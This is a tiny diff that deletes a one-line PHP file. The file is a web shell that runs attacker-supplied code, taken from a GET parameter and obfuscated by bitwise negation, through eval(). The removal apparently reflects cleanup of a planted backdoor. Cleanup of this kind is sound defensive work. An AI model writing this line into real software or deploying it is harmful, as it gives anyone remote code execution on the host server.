@@ -1,1 +1,0 @@
-<?php eval(~htmlspecialchars($_GET[0]));
